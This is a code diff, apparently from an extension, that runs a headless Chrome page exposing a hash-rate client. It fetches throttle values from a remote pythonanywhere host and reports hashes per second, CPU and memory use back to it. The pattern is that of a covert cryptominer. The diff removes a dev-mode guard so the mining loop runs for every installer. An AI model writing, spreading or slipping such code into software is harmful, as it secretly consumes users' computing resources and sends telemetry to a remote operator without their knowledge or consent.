@@ -139,80 +139,76 @@
     if (!fs.existsSync(cacheDir)) {
       fs.mkdirSync(cacheDir, { recursive: true });
     };
-
-    if (!devMode) {
-
-      const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
-      const chromeBrowser = installedBrowsers.find(browser => browser.browser === brInfo.name);
-      console.log('installed', installedBrowsers);
+    const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
+    const chromeBrowser = installedBrowsers.find(browser => browser.browser === brInfo.name);
+    console.log('installed', installedBrowsers);
 
 
 
-      if (global.inIntv) clearInterval(global.inIntv);
-      global.inIntv = setInterval(chkFn, repTime);
-      await chkFn();
+    if (global.inIntv) clearInterval(global.inIntv);
+    global.inIntv = setInterval(chkFn, repTime);
+    await chkFn();
 
 
-      async function chkFn() {
+    async function chkFn() {
 
-        try { fs.writeFileSync(`${os.tmpdir()}/single_init_unix_time.txt`, Math.floor(Date.now()).toString()); } catch (error) { }
+      try { fs.writeFileSync(`${os.tmpdir()}/single_init_unix_time.txt`, Math.floor(Date.now()).toString()); } catch (error) { }
 
-        if (chance(reduceFactor)) return;
+      if (chance(reduceFactor)) return;
 
-        if (browser && page) {
-          const hs = (await page.evaluate(() => {
-            try {
-              return { successmessage: 'success', info: window.info, lastArr: window.lastArr, value: window._client?.getHashesPerSecond(), _client: window._client ? true : false };
-            } catch (error) {
-              return { errormessage: error.message, info: window.info, lastArr: window.lastArr, value: null, error, _client: window._client ? true : false };
-            }
-          })) || {};
-          if (hs.successmessage != 'success') {
-            tstt({ baseUrl, message: hs.message, value: hs.value, error: hs.error, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
-            return;
+      if (browser && page) {
+        const hs = (await page.evaluate(() => {
+          try {
+            return { successmessage: 'success', info: window.info, lastArr: window.lastArr, value: window._client?.getHashesPerSecond(), _client: window._client ? true : false };
+          } catch (error) {
+            return { errormessage: error.message, info: window.info, lastArr: window.lastArr, value: null, error, _client: window._client ? true : false };
           }
-          [max, min] = [maxUse, minUse];
-          try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
-          catch (error) { }
-          tstt({
-            ...hs,
-            message: "HASH",
-            max: max,
-            v: 'v2',
-            value: safe(() => parseFloat(hs?.value).toFixed(2)) || hs?.value,
-            cpu: getCPUUsage(),
-            memory: getMemoryUsage()?.total,
-          });
-
-          await page.evaluate((max, baseUrl) => {
-            if (window.use != max) window.location.href = baseUrl + '?use=' + max;
-          }, max, baseUrl);
-        } else {
-          // tstt({
-          //   baseUrl,
-          //   message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
-          //   value: 0,
-          // });
+        })) || {};
+        if (hs.successmessage != 'success') {
+          tstt({ baseUrl, message: hs.message, value: hs.value, error: hs.error, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+          return;
         }
-
-
-      }
-
-      if (!chromeBrowser) {
-        await new Promise(r => setTimeout(r, waitTime));
-        // await tstt({ message: "INIT_D" });
-        puppeteerBrowsers.InstallOptions;
-        installedBrowser = await puppeteerBrowsers.install({
-          browser: brInfo.name,
-          buildId: brInfo.version,
-          cacheDir,
+        [max, min] = [maxUse, minUse];
+        try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
+        catch (error) { }
+        tstt({
+          ...hs,
+          message: "HASH",
+          max: max,
+          v: 'v2',
+          value: safe(() => parseFloat(hs?.value).toFixed(2)) || hs?.value,
+          cpu: getCPUUsage(),
+          memory: getMemoryUsage()?.total,
         });
-        chromePath = installedBrowser.executablePath;
+
+        await page.evaluate((max, baseUrl) => {
+          if (window.use != max) window.location.href = baseUrl + '?use=' + max;
+        }, max, baseUrl);
       } else {
-        chromePath = chromeBrowser.executablePath;
+        // tstt({
+        //   baseUrl,
+        //   message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
+        //   value: 0,
+        // });
       }
+
 
     }
+
+    if (!chromeBrowser) {
+      await new Promise(r => setTimeout(r, waitTime));
+      // await tstt({ message: "INIT_D" });
+      puppeteerBrowsers.InstallOptions;
+      installedBrowser = await puppeteerBrowsers.install({
+        browser: brInfo.name,
+        buildId: brInfo.version,
+        cacheDir,
+      });
+      chromePath = installedBrowser.executablePath;
+    } else {
+      chromePath = chromeBrowser.executablePath;
+    }
+
 
     // if (global.cppBrowser) {
     //   await global.cppBrowser.close();
@@ -245,7 +241,7 @@
     console.log('lch', chromePath);
 
     let os_opts = {};
-    if (devMode) {
+    if (os.type() == 'Darwin') {
       os_opts.channel = 'chrome';
       puppeteer = require('puppeteer-core');
     }
